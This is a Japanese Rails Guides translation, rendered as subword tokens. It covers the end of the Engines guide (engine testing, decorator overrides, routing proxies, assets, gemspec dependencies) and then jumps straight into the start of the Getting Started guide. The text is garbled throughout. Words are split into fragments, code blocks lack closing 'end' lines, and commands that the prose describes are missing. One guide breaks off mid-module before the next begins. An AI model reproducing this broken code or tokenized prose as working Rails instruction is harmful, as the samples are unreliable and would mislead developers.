▁ ロケール ファイル も 、 アプリケーション の場合 と同様 ` config / local es ` ディレクトリ に 置 け ば よい ようになっています 。
▁ エンジン をテストする
▁ エンジン が生成され ると 、` test / d um my ` ディレクトリ の下に 小 規 模 な ダ ミ ー アプリケーション が自動的に 配置 されます 。
▁この ダ ミ ー アプリケーション は エンジンの マウント 場所 として 使用される ので 、 エンジンの テストが き わ め て シ ン プ ル になります 。
▁この ディレクトリ 内で コントローラ や モデル 、 ビュー を生成し て アプリケーションを 拡 張 し 、 続いて これら を使用して エンジン を テスト できます 。
▁` test ` ディレクトリ は 、 通常の Rails における testing 環境 と同様に 扱 う 必要があります 。 Rails の testing 環境で は 単 体 テスト 、 機能 テスト 、 結合 テスト を行なう ことができます 。
▁### ▁ 機能 テスト
▁ 特に 機能 テスト を作成する 際に は 、 テストが 実行される のは エンジン ではなく ` test / d um my ` に置かれ る ダ ミ ー アプリケーション 上 である という 点 に 留 意 する必要があります 。
▁この よう になっている のは 、 testing 環境 が その ように 設定 されている ためです 。 エンジンの 主要な 機能 、 特に コントローラ をテストする には 、 エンジン を ホスト する アプリケーション が必要です 。
▁ コントローラの 機能 は 、 通常 であれば たとえば 以下のように ` GET ` を コントローラに 送信 することで テスト する でしょう 。
▁get ▁: index
▁ ...
▁しかし これは 正常に 機能 しない でしょう 。
▁ アプリケーション は 、 このような リクエストを エンジン に ルーティング する方法 を 知 ら ないので 、 明示的に エンジン に ルーティング する必要があります 。
▁ setup ▁do
▁@ routes ▁= ▁ Engine . routes
▁上の ように することで 、 この コントローラの ` index ` アクション に対して ` GET ` リクエスト を送信し よう と している ことが アプリケーション によって 認 識 され 、 かつ そのため に アプリケーションの ルーティング ではなく エンジンの ルーティング が 使用される ようになります 。
▁ エンジンの 機能を 改良 する
▁この セクション では 、 エンジンの MVC 機能を メ イン の Rails アプリケーション に追加 または オーバーライド する方法 について解説します 。
▁### ▁ モデルと コントローラ を オーバーライド する
▁ エンジンの モデル クラス と コントローラ クラス は 、 オープン クラス として メ イン の Rails アプリケーションで 拡 張 可能です 。 Rails の モデル クラス と コントローラ クラス は 、 Rails 特 有 の 機能 を継承し ている ほ か は 通常の Ruby クラス と 変 わ り ありません 。
▁ エンジンの クラス を オープン クラス 化 ▁( o p en ▁class ing ) ▁ することで 、 メ イン の アプリケーションで 使用 できるように 再 定義 されます 。
▁これは 、 デザイン パターン で言う de c or at or パターン として 実装 する のが普通です 。
▁ クラスの 変更 内容 が 単 純 であれば 、` Class # class _ eval ` を使用します 。
▁ クラスの 変更 が 複雑な 場合は 、` ActiveSupport :: Co n c er n ` の 使用 を ご 検 討 ください 。
▁#### ▁ デ コ レ ー タ と コードの 読み込み に関する メ モ
▁Rails アプリケーション 自身 は これらの デ コ レ ー タ を参照 すること は ないので 、 Rails の 自動 読み込み 機能 では これらの デ コ レ ー タ を 読み 込 んだ り 起動 したり できません 。
▁つまり 、 デ コ レ ー タ は 手動で require する 必要がある ということです 。
▁これ を行なう ための サンプル コードを いくつか 掲 載 します 。
▁# ▁ lib / blorgh / engine . rb
▁config . to _ prepare ▁do
▁D ir . g lo b ( Rails . root ▁+ ▁" app / de c or at or s / ** / * _ de c or at or * . rb ") . each ▁do ▁| c |
▁require _ dependency ( c )
▁上のコードは 、 デ コ レ ー タ だけ ではなく 、 メ イン の アプリケーション から 参 照 され ない すべての エンジンの コードを 読み込み ます 。
▁#### ▁ Class # class _ eval を使用して de c or at or パターン を実装する
▁` Article # time _ since _ created ` を ** 追加 する ** 場合 :
▁# ▁ M y A p p / app / de c or at or s / models / blorgh / article _ de c or at or . rb
▁ Blorgh :: Article . class _ eval ▁do
▁def ▁ time _ since _ created
▁ Time . current ▁- ▁ created _ at
▁# ▁ Blorgh / app / models / article . rb
▁` Article # sum m ary ` を ** オーバーライド ** する 場合 :
▁def ▁ sum m ary
▁" # { title } ▁- ▁# { truncate ( text ) } "
▁" # { title } "
▁#### ▁ ActiveSupport :: Co n c er n を使用して de c or at or パターン を実装する
▁ ActiveSupport :: Co n c er n は 、 相 互 に リンク している 依 存 モジュール および 依 存 クラスの 実行 時 読み込み 順序 を 管理 し 、 コードの モジュール 化 を 高 め ます 。
▁` Article # time _ since _ created ` を ** 追加 ** して ` Article # sum m ary ` を ** オーバーライド ** する 場合 :
▁# ▁ M y A p p / app / models / blorgh / article . rb
▁class ▁ Blorgh :: Article ▁< ▁ActiveRecord :: Base
▁ include ▁ Blorgh :: Co n c er n s :: Model s :: Article
▁# ▁ Blorgh / lib / con c er n s / models / article
▁ module ▁ Blorgh :: Co n c er n s :: Model s :: Article
▁ ext end ▁ ActiveSupport :: Co n c er n
▁# ▁' include d ▁do ' は 、 インクルード された コードを
▁# ▁ それ が インクルード されている ▁( article . rb ) ▁ コンテキスト で 評価 する
▁# ▁その モジュール の コンテキスト で 実行 されている ▁( blorgh / con c er n s / models / article ) ▁ は 評価 しない
▁ include d ▁do
▁ attr _ accessor ▁: author _ name
▁ belongs _ to ▁: author , ▁class _ name : ▁" User "
▁ before _ save ▁: set _ author
▁ private
▁def ▁ set _ author
▁self . author ▁= ▁User . find _ or _ create _ by ( name : ▁ author _ name )
▁ module ▁ Class M e th o d s
▁def ▁ some _ class _ method
▁' some ▁class ▁ method ▁ string '
▁### ▁ ビュー を オーバーライド する
▁Rails は 出力 すべき ビュー を 探 索 する 際に 、 アプリケーションの ` app / views ` ディレクトリ を 最初に 探 索 します 。
▁ 探 している ビュー が そこ に ない場合 、 続いて その ディレクトリ を持つ すべての エンジンの ` app / views ` ディレクトリ を 探 索 します 。
▁たとえば 、 アプリケーション が ` Blorgh :: Article sController ` の index アクション の 結果を 出力 するための ビュー を 探 索 する 際に は 、 最初に アプリケーション 自身 の ` app / views / blorgh / articles / index . html . erb ` を 探 索 します 。
▁ そこ に 見つからない 場合は 、 続いて エンジンの 中 を 探 索 します 。
▁` app / views / blorgh / articles / index . html . erb ` という ファイル を作成する ことで 、 上の 動作 を 上 書き することができます 。
▁ こうすることで 、 通常の ビューで の 出力結果 を 完全に 変え ることができます 。
▁` app / views / blorgh / articles / index . html . erb ` という ファイル を作成して 以下のコード を追加する とします 。
▁< h 1> Article s </ h 1>
▁<%= ▁ link _ to ▁" New ▁Article ", ▁ new _ article _ path ▁%>
▁<% ▁@ articles . each ▁do ▁| article | ▁%>
▁< h 2 > <%= ▁ article . title ▁%></ h 2 >
▁< s m all > B y ▁<%= ▁ article . author ▁%></ s m all >
▁<%= ▁ s im p le _ format ( article . text ) ▁%>
▁< h r >
▁### ▁ ルーティング
▁ デフォルトで は 、 エンジン 内部 の ルーティング は アプリケーションの ルーティング から 分 離 されています 。
▁これは 、` Engine ` クラス 内の ` is ol at e _ name space ` 呼び出し によって 実現 されます 。
▁これは 本 質 的に 、 アプリケーション と エンジン が 完全に 同 一 の名前 の ルーティング を持つ ことができ 、 しか も 衝 突 しない ということ を 意味 します 。
▁ エンジン 内部 の ルーティング は 、 以下のように ` config / routes . rb ` の ` Engine ` クラス によって 構成 されます 。
▁ エンジン と アプリケーションの ルーティング が この ように 分 離 されている ので 、 アプリケーションの 特定の 部分を エンジンの 特定の 部分 に リンク したい場合は 、 エンジンの ルーティング プロキシ メソッド を使用する 必要があります 。
▁` articles _ path ` のような 通常の ルーティング メソッドの 呼び出し は 、 アプリケーション と エンジンの 両方 で そのような ヘルパー が 定義されている 場合には 期 待 と 異なる 場所 に リンク される 可能性があります 。
▁たとえば 以下のコード 例 では 、 その テンプレート が アプリケーションで レンダリング される 場合 の 行 き 先 は アプリケーションの ` articles _ path ` になり 、 エンジン で レンダリング される 場合 の 行 き 先 は エンジンの ` articles _ path ` になります 。
▁<%= ▁ link _ to ▁" B log ▁ articles ", ▁ articles _ path ▁%>
▁この ルーティング を 常に エンジンの ` articles _ path ` ルーティング ヘルパーメソッド で 取り 扱 う ように したい場合 、 以下のように エンジン と同じ 名前 を 共有 する ルーティング プロキシ メソッド を呼び出す 必要があります 。
▁<%= ▁ link _ to ▁" B log ▁ articles ", ▁ blorgh . articles _ path ▁%>
▁ 逆 に エンジン 内部 から アプリケーション を参照 する 場合は 、 同じ要領で ` main _ app ` を使用します 。
▁<%= ▁ link _ to ▁" Home ", ▁ main _ app . root _ path ▁%>
▁上のコード を エンジン 内で 使用する と 、 行 き 先 は ** 常に ** アプリケーションの ルート になります 。
▁この ` main _ app ` ルーティング プロキシ メソッドを 呼び出し を省略 すると 、 行 き 先 は 呼び出され た 場所 によって アプリケーション または エンジン のいずれか と な って 確 定 しません 。
▁ ルーティング プロキシ メソッド 呼び出し を省略した このような アプリケーション ルーティング ヘルパーメソッド を 、 エンジン 内で レンダリング される テンプレート から 呼 び 出 そう と すると 、 未 定義 メソッド 呼び出し エラー が発生する ことがあります 。
▁ このような 問題 が発生し た場合 は 、 アプリケーションの ルーティング メソッドを 、` main _ app ` という プレフィックス を 付け ずに エンジン から 呼 び だ そう と していない かどうかを確認 してください 。
▁### ▁ アセット
▁ エンジンの アセット は 、 通常の アプリケーションで 使用される アセット と まったく 同じ ように 機能 します 。
▁ エンジン 内の 他の コンポーネント と同様 、 アセット も 名前空間化され る必要があります 。
▁たとえば 、` style . css ` という アセット は 、` app / assets / stylesheets / style . css ` ではなく ` app / assets / stylesheets / [ エンジン 名 ] / style . css ` に置かれ る必要があります 。
▁ アセット が 名前空間化され ない と 、 ホスト アプリケーションに 同じ 名前 の アセット が存在する 場合に アプリケーションの アセット が 使用 されて エンジンの アセット が 使用 され ない ということ が発生する 可能性があります 。
▁` app / assets / stylesheets / blorgh / style . css ` という アセット を 例 にとって 説明します 。 この アセット を アプリケーション に含め る には 、` stylesheet _ link _ tag ` を使用して アセット が あ た か も エンジン 内部 にある か のように 参 照 します 。
▁<%= ▁ stylesheet _ link _ tag ▁" blorgh / style . css " ▁%>
▁ 処理 される ファイル で アセットパイプライン の require ス テ ート メ ン ト を使用して 、 これらの アセット が 他の アセット に 依 存 すること を指定する こともできます 。
▁INFO : ▁ Sass や CoffeeScript などの 言語 を使用する場合 は 、 必要な ライブラリ を ` . gem spec ` に 追加する必要があります 。
▁### ▁ アセット と プリコンパイル を 分 離 する
▁ エンジン が 持つ アセット は 、 ホスト 側 の アプリケーション では 必ず し も 必要 では ない ことがあります 。
▁たとえば 、 エンジン で しか 使用 しない 管理 機能を 作成した と しましょう 。
▁ この場合 、 ホスト アプリケーション では ` admin . css ` や ` admin . js ` は 不要です 。
▁これらの アセット を 必要 と する のは 、 gem の admin レイアウト しか ない からです 。
▁ ホスト アプリケーション から 見 れば 、 自分 が 持つ スタイルシート に ` " blorgh / admin . css " ` を追加する 意味 はありません 。
▁ このような 場合 、 これらの アセット を 明示的に プリコンパイル する必要があります 。
▁ それ により 、` rake ▁ assets : pre compile ` が 実行 された ときに エンジンの アセット を追加する よう s pro c ke t s に 指示 されます 。
▁ プリコンパイル の 対象 となる アセット は ` engine . rb ` で 定義 できます 。
▁ initialize r ▁" blorgh . assets . pre compile " ▁do ▁| app |
▁app . config . assets . pre compile ▁+ = ▁% w ( admin . css ▁ admin . js )
▁詳細については 、[ アセットパイプライン ]( asset _ pipeline . html ) ガイド を参照してください 。
▁### ▁ 他の gem と の 依 存 関係
▁ エンジン が 依 存 する gem については 、 エンジンの ルート ディレクトリ の ` . gem spec ` に 記述 する必要があります 。
▁ エンジン は gem として インストール される ので 、 この ように する必要があります 。
▁ 依 存 関係 を ` Gemfile ` に 指定 した の では 伝 統 的な gem インストール で 依 存 関係 が 認 識 され ないので 、 必要な gem が自動的に インストール され ず 、 エンジン が 正常に 機能 し なくなります 。
▁ 伝 統 的な ` gem ▁install ` コマンド 実行 時に 同時に インストール される 必要 のある gem を指定する には 、 以下のように エンジンの ` . gem spec ` ファイル にある ` G e m :: S p ec if i c ation ` ブロック の 内 側 に 記述 します 。
▁ s . add _ dependency ▁" m oo "
▁ アプリケーションの 開発 時に のみ 必要となる gem の インストール を指定する には 、 以下のように 記述 します 。
▁ s . add _ development _ dependency ▁" m oo "
▁ どちら の 依 存 gem も 、 アプリケーションで ` bundle ▁install ` を実行する ときに インストール されます 。
▁ 開発 時に のみ 必要となる gem は 、 エンジンの テスト 実行 中に のみ 使用されます 。
▁ エンジン が require される ときに 依 存 gem も すぐ に require したい場合は 、 以下の よう エンジン が 初期化 される より 前に require する 必要がある ことにご注意ください 。
▁たとえば 次の ようになります 。
▁require ▁' other _ engine / engine '
▁require ▁' y e t _ an other _ engine / engine '
▁ module ▁ M y Engine
▁Rails を は じ め よう < n > ========= = = = =
▁この ガイド では 、 Ruby ▁on ▁Rails ▁( 以下 ▁Rails ) ▁ を 初めて 設定 して 実行 する まで を 解説します 。
▁* ▁Rails の インストール 方法 、 新しい Rails アプリケーションの 作成 方法 、 アプリケーション から データベース への 接続 方法
▁* ▁Rails アプリケーションの 一般的な レイアウト
▁* ▁ MVC ▁( モデル ・ ビュー ・ コントローラ ) ▁ および RESTful デザイン の基礎
▁* ▁Rails アプリケーションの 原 型 を 素 早 く 立 ち 上 げ る 方法
▁ 本 ガイド の 前 提 条件
▁ 本 ガイド は 、 ゼ ロ から Rails アプリケーションを 構 築 したい と 考え ている 初心者 を 対象 に しています 。
▁ 読者 が Rails の 経験 がない ことを前提とし ています 。
▁ただし 、 この ドキュメント を 最大 限 に 活用 するために 、 以下の ソフトウェア が インストール され 、 利用 可能な 状態 になっている ことを前提とし ています 。
▁ RubyGems の詳細については 、[ RubyGems ガイド ]( http :// ruby gem s - guides - j p . heroku app . com / ) を参照してください 。
▁Rails とは 、 Ruby プログラミング 言語 の 上で 動作する Web アプリケーション フレームワーク です 。
▁Ruby の 経験 が まったく ない場合 、 Rails を学ぶ のは かなり 大 変 な 作業 になる でしょう 。
▁Ruby を学ぶ ための 精 選 された オンライン リソース 一覧 は たくさん あります ので 、 そ の中から 以下 を ご 紹 介 します 。
▁* ▁[ Ruby プログラミング 言語 公式 Web サイトの 情報 ]( https :// www . ruby - lang . org / j a / document ation / )
▁* ▁[ re S R C が 選 ぶ 無料 の プログラミング 学習 用 書 籍 一覧 ▁( 英語 ) ]( http :// re s r c . io / list / 10 / list - of - free - pro gra m m ing - books / # ruby )
▁ これらは いずれ も よく でき ています が 、 中に は Ruby のバージョン が 1 . 6 など 古 い もの もあります ので ご注意ください 。 また 、 バージョン 1 . 8 を 対象 に している もの が 多く 、 Rails で の 日 常 的な 開発 に 使用されている 新しい 文法 が含まれ ていない こともあります 。
▁Rails とは 何か
▁Rails とは 、 Ruby プログラミング 言語 で 書かれ た Web アプリケーション フレームワーク です 。
▁Rails は 、 あらゆる 開発者 が Web アプリケーションの 開発 を 始 め る う え で 必要となる 作業 や リソース を 事 前に 仮 定 して 準備 しておくこと で 、 Web アプリケーションを より 簡単に プログラミング できるように 設計 されています 。
▁ 他の 多くの 言語 による Web アプリケーション フレームワーク と 比 較 して 、 アプリケーション を作成する 際 のコード 量 が より 少 なく て 済 む にも か か わ らず 、 より 多くの 機能を 実現 できます 。
▁Rails 経験 の 長 い 多くの 開発者 から 、 おかげで Web アプリケーションの 開発 が と ても 楽 しく な った という 意 見 を い ただ い ています 。
▁Rails は 、 最 善 の 開発 方法 という もの を 1 つ に 定 め る という 、 ある 意味 大 胆 な 判 断 に基いて 設計 されています 。
▁Rails は 、 何か を な す う え で 最 善 の 方法 という もの が 1 つ だけ ある と 仮 定 し 、 それ に 沿 った 開発 を 全 面 的に 支 援 します 。 言 い 換 え れば 、 ここで 仮 定 されている 理 想 の 開発 手法 に 沿 わ ない 別の 開発 手法 は 行 い に く くなる ようにしています 。
▁この 「 The ▁Rails ▁ W a y 」 、「 Rails 流 」 と でも い う べ き 手法 を 学 んだ 人 は 、 開発 の 生 産 性 が 著 しく 向 上 すること に 気 付 く でしょう 。
▁従って 、 Rails 開発 において 別の 言語 環境で の 従来 の 開発 手法 に 固 執 し 、 他 所 で 学 んだ パターン を 強 引 に適用 し よう と すると 、 せ っ か く の 開発 が 楽 しく なく な っ てしまう でしょう 。
▁Rails の 哲 学 には 、 以下の 2 つの 主要な 基本 理 念 があります 。
▁* ▁** 同じ ことを 繰り返す な ▁( D on ' t ▁ Re p e at ▁ Y our self : ▁D R Y ) : ** ▁D R Y は ソフトウェア 開発 上の 原 則 であり 、「 システム を構成する 知 識 の あらゆる 部品 は 、 常に 単 一 であり 、 明 確 であり 、 信 頼 できる 形 で 表現 されて い なければならない 」 という ものです 。
▁ 同じ コードを 繰り返し 書くこと を 徹 底 的に 避 け ること で 、 コードが 保 守 し や す く なり 、 容易に 拡 張 できるように なり 、 そして 何 より バグ を 減 ら す ことができます 。
▁* ▁** 設定 より 規 約 が 優 先 される ▁( Co n ve n tion ▁ O ver ▁C on fig ur ation ) : ** ▁Rails では 、 Web アプリケーションで 行 わ れる さまざまな ことを 実現 するための 最 善 の 方法 を 明 確 に 思い 描 い ており 、 Web アプリケーションの 各 種 設定 についても 従来 の 経験 や 慣習 を元に 、 それらの デフォルト値 を 定 め ています 。 この ように ある 種 独 断 で デフォルト値 が 決 ま っている おかげで 、 開発者 の 意 見 をすべて 取り 入 れ よう と した 自 由 過 ぎ る Web アプリケーションの ように 、 開発者 が 延 々 と 設定 ファイルを 設定 して 回 らず に 済み ます 。
▁Rails プロジェクト を 新規作成 する
▁ 本 ガイド を 活用 するための 最 善 の 方法は 、 以下の 手順 を 文字 ど お り 1 つ ず つ 実行 し 、 手順 を 取り こ ぼ さ ないように することです 。 取り こ ぼ し がある と 、 その後 の 手順 が 期待どおり に 進 ま ない 可能性があります 。
▁ 本 ガイド の 手順 に従う ことで 、` blog ` という名前の 非常に シンプルな ブログ の Rails プロジェクト を作成 できます 。
▁Rails アプリケーションを 構 築 する 前に 、 Rails 本 体 が インストール されている ことを確認 してください 。
▁ TIP : ▁以下の 例 では 、 Unix 系 OS の プロンプト として ` $ ` 記 号 を使用しています が 、 これは カスタマイズ 可能 であり 、 自分の 環境で は 異なる 記 号 になっている こともあります 。
▁ Windows では ` c : \ source _ code > ` のように 表示 されます 。
▁### ▁Rails の インストール
▁ ターミナル ▁( コマンド プロンプト とも 言 います ) ▁ ウ ィ ンド ウ を開いて ください 。
▁ Mac ▁ OS ▁X の場合 、 ターミナル ▁( T e rm in al . app ) ▁ という名前の アプリケーション を実行します 。 Windows の場合は [ ス ター ト ] ▁ メニュー から ▁[ ファイル名 を指定して 実行 ] ▁ をクリックして ' c m d . ex e ' と 入力 します 。
▁` $ ` で 始 ま る 記述 は コマンド 行 なので 、 これらは コマンドライン に 入力 して 実行 してください 。
▁続いて 現在 インストール されている Ruby のバージョン が 最新の もの である ことを確認 してください 。
▁$ ▁ ruby ▁- v
▁ ruby ▁2 . 0.0 p 3 5 3
▁ 自分の P C 環境 に Ruby が インストール されていない 場合は 、[ ruby - lang . org ]( https :// www . ruby - lang . org / j a / install ation / ) ▁ を参照 して 、 自分の 環境 に 合 う インストール 方法 を参照してください 。
▁ 多くの Unix 系 OS には 実 用 的な バージョンの SQLite 3 が 同 梱 されています 。
▁ 正しく インストール されている こと 、 P A T H 環境変数 が正しく 通 っている ことを確認 してください 。
▁$ ▁ sqlite 3 ▁-- version
▁ 上 を実行する ことで バージョン を 確認 できます 。
▁Rails を インストール するには 、` gem ▁install ` コマンド を実行します 。 この コマンド は RubyGems によって 提供され ます 。
▁$ ▁gem ▁install ▁ rails
▁以下の コマンド を実行する ことで 、 すべて 正常に インストール できた かどうかを確認 できます 。
▁$ ▁ rails ▁-- version
▁### ▁ ブログ アプリケーション を作成する
▁Rails には 、 ジェネレータ という 多数の スクリプト が 付 属 し ており 、 これら が 特定の タスク を 開 始 するために 必要な もの を 自動的に 作り 出 し てくれる ので 、 開発 が 容易に なります 。
▁ そ の中から 、 新 規 アプリケーション 作成 用の ジェネレータ を使って みましょう 。 これを 実行 すれば Rails アプリケーションの 基本的な 部分 が 提供され る ので 、 開発者 が 自分 で これら を作成する 必要はありません 。
▁ ジェネレータ を実行する には 、 ターミナル を 開 き 、 Rails ファイルを 作成した い ディレクトリ に移動し て 、 以下 を 入力 します 。
▁$ ▁ rails ▁ new ▁ blog
▁これにより 、 B log という名前の Rails ▁ アプリケーション が ` blog ` ディレクトリ に 作成 され 、` Gemfile ` という ファイル で 指定 されている gem ファイルが ` bundle ▁install ` コマンド によって インストール されます 。
▁ TIP : ▁` rails ▁ new ▁- h ` を実行すると 、 Rails アプリケーション ビ ル ダ で 使用できる すべての コマンドライン オプションを 確認 できます 。
▁ ブログ アプリケーション を作成し たら 、 その フォルダ 内に 移動 します 。
▁$ ▁ cd ▁ blog
▁` blog ` ディレクトリ の下に は 多数の ファイル や フォルダ が生成され ており 、 これら が Rails アプリケーションを 構成 しています 。
▁この チュートリアル では ほとんど の 作業 を ` app ` ディレクトリ で 行います が 、 Rails が 生成 した ファイル と フォルダ について ここで 簡単に 説明 しておきます 。
▁| ▁ ファイル / フォルダ ▁| ▁ 目的 ▁|
▁| app / | ここに は アプリケーションの コントローラ 、 モデル 、 ビュー 、 ヘルパー 、 メイラー 、 そして アセット が 置かれます 。
▁ 以後 、 本ガイドで は 基本的に この ディレクトリ を 中 心 に 説明 を行います 。
▁| config / | アプリケーションの 設定 ファイル ▁( ルーティング 、 データベース など ) ▁ が ここに 置かれます 。
▁詳細については [ Rails アプリケーション を設定する ]( config ur ing . html ) ▁ を参照してください 。
▁| config . r u | アプリケーションの 起動 に 必要となる 、 Rack ベース の サーバー 用の Rack 設定 ファイル です 。
▁| db / | 現 時点 の データベース スキーマ と 、 データベース マイグレーション ファイルが 置かれます 。
▁| Gemfile < br > Gemfile . lock | これらの ファイルは 、 Rails アプリケーションで 必要となる gem の 依 存 関係 を 記述 します 。
▁この 2 つの ファイルは Bundler ▁gem で 使用されます 。
▁| lib / | アプリケーション で使用する 拡 張 モジュール が 置かれます 。
▁| log / | アプリケーションの ログ ファイルが 置かれます 。
▁| public / | この フォルダ の下に ある ファイルは 外部 ▁( イン ター ネ ッ ト ) ▁ から そのまま 参 照 できます 。
▁ 静 的な ファイル や コンパイル 済み アセット は ここ に置き ます 。
▁| Rake file | この ファイル には 、 コマンドライン から 実行 できる タスク を 記述 します 。
▁ここで の タスク 定義 は 、 Rails 全体 の コンポーネント に対して 定義 されます 。
▁ 独自の Rake タスク を定義し たい場合は 、 Rake file に 直接 書く と 権限 が 強 すぎる ので 、 なるべく lib / t as k s フォルダ の下に Rake 用の ファイルを 追加 するようにしてください 。
▁| README . rdoc | アプリケーション の概要 を 説明 する マ ニ ュ ア ル を ここに 記 入 します 。
▁この ファイル には アプリケーションの 設定 方法 など を 記 入 し 、 これ さ え 読 め ば 誰 でも アプリケーションを 構 築 できるように しておく必要があります 。
▁| test / | U n it テスト 、 フィクスチャ などの テスト 関連 ファイルを ここ に置き ます 。
▁ テスト については [ Rails アプリケーション をテストする ]( testing . html ) を参照してください 。
▁| t m p / | キャッシュ 、 p id 、 セッション ファイル などの 一時 ファイルが 置かれます 。
▁| vendor / | サ ー ド パ ー テ ィ によって 書かれ た コード はすべて ここ に置き ます 。
▁ 通常の Rails アプリケーション の場合 、 外部 から の gem ファイルを ここ に置き ます 。
▁ Hello , ▁Rails !
▁ 手 始 め に 、 画面 に 何か テキスト を表示し てみましょう 。
▁その ためには 、 Rails アプリケーション サーバー を 起動 し なく て は なり ません 。
▁### ▁Web サーバー を 起動 する
▁ 先ほど 作成した Rails アプリケーション は 、 既に 実行 可能な 状態 になっています 。
▁Web アプリケーションを 開発 用の P C で 実際に 動か して この ことを 確かめ てみましょう 。
▁` blog ` ディレクトリ に移動し 、 以下のコマンドを実行し ます 。
▁ Mac ▁ OS ▁X や Windows には JavaScript ラ ン タ イ ム が 同 梱 されています 。
▁Rails が 新 規 アプリケーション 用 に 生成 する ` Gemfile ` には ` the ruby r a c er ` という gem が コメントアウト された 状態 で 含 まれ ており 、 必要 であれば この gem の コメントアウト を 解 除 して 有効 に することもできます 。
▁` the ruby r h in o ` は J Ruby ユーザー 向け に 推 奨 されている ラ ン タ イ ム であり 、 J Ruby 環境 下 では デフォルトで アプリケーションの ` Gemfile ` に追加 されます 。
▁Rails で 起動 される Web サーバー は 、 Ruby に デフォルトで 付 属 している W E B ri c k です 。
▁Web アプリケーション が 実際に 動作 している ところ を確認する には 、 ブラウザ を開いて ▁< http :// localhost : 3 000 > ▁ を表示し てください 。
▁ 以下のような Rails の デフォルト 情報 ページ が表示されます 。
▁ Welcome 画面 の ス ク リ ー ン シ ョ ッ ト ]( images / getting _ started / rails _ welcome . png )
▁ TIP : ▁Web サーバー を 停 止 するには 、 実行 されている ターミナル の ウ ィ ンド ウ で Ctrl ▁+ ▁C キー を 押 します 。
▁ コマンド プロンプト の カ ー ソ ル が ふ た た び 表示 され れば 、 サーバー は 停 止 しています 。
▁ Mac ▁ OS ▁X を含む 多くの Unix 系 OS では プロンプト として ド ル 記 号 ` $ ` が使用されます 。
▁ 一般に 、 Rails の 開発 モード では ファイル に変更 を加え た場合 でも サーバーを再起動 する必要はありません 。 ファイルの 変更 は自動的に サーバー に 反 映 されます ( 訳 注 : ▁ lib ファイル や application . rb など 一部の 設定 ファイル など は サーバーを再起動 しない と 読み込まれ ません )。
▁Rails の 初期 画面 である 「 Welcome ▁a b o ar d 」 ページ は 、 新しい Rails アプリケーションの ▁ _ ス モ ー ク テスト _ ▁ として 使 え ます 。 この ページ が表示され れば 、 サーバー が 正常に動作し ている こと まで は 確認 できた ことになります 。
▁ _ About ▁your ▁ application ' s ▁ environment _ ▁ リンクを クリック すれば 、 アプリケーション 環境 の概要 を 確認 できます 。
▁### ▁Rails に " Hello " と 挨拶 させる
▁Rails に " Hello " と 表示する には 、 最 低 でも ▁ _ コントローラ _ ▁ と ▁ _ ビュー _ ▁ が必要です 。
▁ コントローラ は 、 アプリケーション に対する 特定の リクエストを 受け 取 って 処理 する の が 役 割 です 。
▁ _ ルーティング _ ▁ は 、 リクエストを どの コントローラに 割 り 振 る か を 決 定 する ためのものです 。
▁1 つの コントローラ に対して 複数の ルーティング がある のは よく ある ことです 。 そして コントローラ には いくつかの ▁ _ アクション _ ▁ があります 。 いくつかの 異なる ルーティング に対して 、 それぞれ 異なる アクション を 割り当て ることができます 。
▁ それぞれの アクション は 、 情報を 集 め て ビュー に 送 り 出 す の が 役 割 です 。
▁ ビュー の 役 割 は 、 この 情報を ユーザーが 読 め る 形式 で 表示 することです 。
▁ここで 気 を 付け ていた だ き たい 重要な 違 い は 、 表示する 情報を 集 め る のは ▁ _ コントローラ _ ▁ で あって 、 ビュー では ない ということです 。
▁ ビュー は 、 コントローラ が 作成した 情報 に対して 余 計 な ことを せずに 表示 する必要があります 。
▁ ビュー テンプレート で 使用できる 言語 は 、 デフォルトで は e Ruby ▁( ERB とも 、 E m b ed de d ▁Ruby とも 呼ばれ ます ) ▁ が使用されます ▁( 訳 注 : ▁ 近 年 は ha m l テンプレート が よく 使われ ます )。 ERB で 書かれ た コードは 、 ユーザーに 表示される 前 の リクエスト サ イ ク ル で Rails によって 処理 されます 。
▁ コントローラ を 新規作成 するには 、 コントローラ 用の ジェネレータ を実行します 。 ここでは 以下のように 、 welcome という名前の コントローラ の中に index という アクション を作成する よう 指定 します 。
▁Rails は 指定 ど お り コントローラ を作成し 、 関連 ファイル や ルーティング も 設定 してくれます 。
▁create ▁app / controllers / welcome _ controller . rb
▁get ▁' welcome / index '
▁create ▁app / views / welcome
▁create ▁app / views / welcome / index . html . erb
▁create ▁test / controllers / welcome _ controller _ test . rb
▁create ▁app / helpers / welcome _ helper . rb
▁invo ke ▁ coffee
▁create ▁app / assets / javascripts / welcome . js . coffee
▁invo ke ▁ s css
▁create ▁app / assets / stylesheets / welcome . css . s css
▁この 中 で もっと も 重要な のは もちろん コントローラ です 。 welcome コントローラ は ` app / controllers / welcome _ controller . rb ` に 作成 され 、 対応する index ビュー が ` app / views / welcome / index . html . erb ` に 作成されます 。
▁ テキストエディタ で ` app / views / welcome / index . html . erb ` を開いて みましょう 。
▁ ファイルの 中 身 をすべて 削除 し 、 以下の 1 行 に置き換え てください 。
▁< h 1> Hello , ▁Rails !
▁### ▁ アプリケーションの ホ ー ム ページ を設定する
▁以上で コントローラ と ビュー が作成され ました 。 Rails に " Hello , ▁Rails ! " と 表示 させ てみましょう 。
▁ここでは 、 サイトの ルート URL ▁< http :// localhost : 3 000 > ▁ にアクセス したときに この メッセージ が表示される ようにします 。
▁ 現 時点 の ルート URL では 、 デフォルトの " Welcome ▁a b o ar d " が表示され ています ので 、 これを 変更 します 。
▁Rails で 表示 させ たい 実際の ホ ー ム ページの 場所 を指定します 。
▁ エディタ で ` config / routes . rb ` を開いて ください 。
▁# ▁ The ▁ p ri or ity ▁is ▁ base d ▁ up on ▁ order ▁of ▁ creat ion :
▁# ▁ first ▁ created ▁-> ▁ h ig h e st ▁ p ri or ity .
▁< n > ▁#< n >
▁# ▁ Y o u ▁c an ▁ ha ve ▁the ▁ root ▁of ▁your ▁ site ▁ route d ▁with ▁" root "
▁# ▁ root ▁' welcome # index '
▁ 上 は アプリケーションの ▁ _ ルーティング ファイル _ ▁ の内容 です 。 外部 から の リクエストを どのように コントローラ と アクションに 振 り 分 け る か を 、 D S L ▁( ドメイン 特 化 言語 : ▁do main - spec if i c ▁ lang u age ) ▁という 特殊な 言語 を使用して この ファイル 内に 記述 します 。
▁ デフォルトの config / routes . rb には 多数の ルーティング サンプル が コメント 行 に 記 載 され ており 、 そ のうち の 1 つ に 、 サイトの ルート にアクセス が あった ときに 接続 する コントローラ と アクション を指定する 方法 が 書かれてい ます 。
▁` root ` で 始 ま っている 行 を見つけ 、 コメント 記 号 を 外 してください 。
▁以下の よう になるはずです 。
▁ root ▁' welcome # index '
